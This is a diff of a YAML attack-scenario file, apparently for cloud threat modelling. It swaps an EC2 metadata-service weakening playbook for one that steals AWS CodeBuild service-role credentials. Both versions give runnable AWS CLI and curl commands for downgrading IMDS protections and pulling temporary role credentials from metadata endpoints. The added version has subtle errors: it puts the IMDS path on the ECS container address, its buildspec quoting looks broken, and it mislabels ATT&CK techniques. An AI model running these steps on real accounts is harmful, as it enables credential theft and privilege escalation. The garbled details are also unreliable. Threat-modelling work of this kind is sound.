@@ -1,59 +1,43 @@
 attack:
-  id: AWS-EC2-IMDS-WEAKENING-001
-  name: EC2 Instance Metadata Service Weakening via ModifyInstanceMetadataOptions
-  overview: |
-    An attacker with ec2:ModifyInstanceMetadataOptions permission can weaken Instance Metadata Service (IMDS) protections on EC2 instances. By modifying metadata options, the attacker can force downgrade to IMDSv1 (disabling token requirement), increase HttpPutResponseHopLimit beyond the default, or disable the endpoint entirely. The primary risk involves raising HttpPutResponseHopLimit from 1 to 2 or higher, allowing the 169.254.169.254 metadata endpoint to become reachable outside the instance's network namespace. This enables credential exfiltration from containers, sidecars, or co-located processes that normally cannot access the instance metadata service, leading to theft of temporary AWS credentials and privilege escalation.
+
+attack:
+  id: AWS-CODEBUILD-PRIVESC-001
+  name: AWS CodeBuild Service Role Credential Extraction
+  overview: An attacker exploits iam:PassRole and codebuild:CreateProject permissions to create a malicious CodeBuild project that extracts sensitive IAM service role credentials by querying the instance metadata service.
   steps:
-    - title: Enumerate Target EC2 Instances
+    - title: Create Malicious CodeBuild Project
       command: |
-        aws ec2 describe-instances \
-          --query 'Reservations[*].Instances[?IamInstanceProfile].[InstanceId,State.Name,IamInstanceProfile.Arn]' \
-          --output table
+        aws codebuild create-project \
+          --name malicious-build \
+          --source type=NO_SOURCE,buildspec="version: 0.2
+        phases:
+          build:
+            commands:
+              - curl http://169.254.170.2/latest/meta-data/iam/security-credentials/"
+          --artifacts type=NO_ARTIFACTS \
+          --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:1.0,computeType=BUILD_GENERAL1_SMALL \
+          --service-role arn:aws:iam::<ACCOUNT_ID>:role/<PRIVILEGED_ROLE>
       dependencies:
-        - ec2:DescribeInstances
-        - Target instance must exist and be in running or stopped state
-      result: |
-        Identified EC2 instances with IAM instance profiles that are potential targets. The attacker determines which instances to compromise based on their role and attached credentials.
-      ttp: T1526 - Gather System Network Configuration Discovery
-    - title: Retrieve Current Instance Metadata Options
-      command: |
-        aws ec2 describe-instances \
-          --instance-ids <INSTANCE_ID> \
-          --query 'Reservations[0].Instances[0].MetadataOptions' \
-          --output json
+        - iam:PassRole permission
+        - codebuild:CreateProject permission
+        - Access to a privileged IAM service role
+      result: Malicious CodeBuild project created with a buildspec designed to extract IAM role credentials
+      ttp: T1552.005 Unsecured Credentials - Cloud Instance Metadata
+    
+    - title: Start Malicious Build
+      command: aws codebuild start-build --project-name malicious-build
       dependencies:
-        - ec2:DescribeInstances
-        - Target instance ID identified from previous step
-      result: |
-        Retrieved current IMDS configuration including HttpTokens status, HttpPutResponseHopLimit value, and endpoint state. This baseline shows the current security posture before modification.
-      ttp: T1526 - Gather System Network Configuration Discovery
-    - title: Weaken Instance Metadata Service Protections
-      command: |
-        aws ec2 modify-instance-metadata-options \
-          --instance-id <INSTANCE_ID> \
-          --http-tokens optional \
-          --http-endpoint enabled \
-          --http-put-response-hop-limit 2
+        - Successful creation of malicious CodeBuild project
+      result: Build executes, exposing temporary credentials from the service role's metadata
+      ttp: T1098.001 Account Manipulation - Additional Cloud Credentials
+    
+    - title: Credential Extraction and Potential Misuse
+      command: N/A (happens within build container)
       dependencies:
-        - ec2:ModifyInstanceMetadataOptions permission
-        - Target instance ID
-        - Instance must be running or stopped (not terminated)
-      result: |
-        Successfully modified IMDS configuration. HttpTokens set to optional (downgraded to IMDSv1), allowing unauthenticated metadata access. HttpPutResponseHopLimit increased to 2, enabling metadata endpoint access from containers and co-located processes outside the instance's network namespace.
-      ttp: T1578.001 - Modify Cloud Compute Infrastructure
-    - title: Exfiltrate Temporary Credentials via Modified IMDS
-      command: |
-        curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ && \
-        curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
-      dependencies:
-        - Network access to 169.254.169.254 from compromised container or process
-        - HttpPutResponseHopLimit set to 2 or higher
-        - HttpTokens set to optional or HttpEndpoint enabled
-        - Instance IAM role with assumable permissions
-      result: |
-        Retrieved temporary AWS credentials (AccessKeyId, SecretAccessKey, Token, Expiration) from the instance metadata service. The attacker now possesses valid temporary credentials associated with the instance's IAM role, enabling lateral movement and privilege escalation within the AWS environment.
-      ttp: T1552.001 - Unsecured Credentials - Credentials In Files
+        - Successful retrieval of IAM role credentials
+      result: Attacker obtains temporary AWS credentials with potentially elevated permissions, enabling further unauthorized actions
+      ttp: T1550.002 Use Alternate Authentication Material - Pass the Ticket
+  
   stride_goal:
-    - Elevation of Privilege
     - Information Disclosure
-    - Tampering
+    - Elevation of Privilege
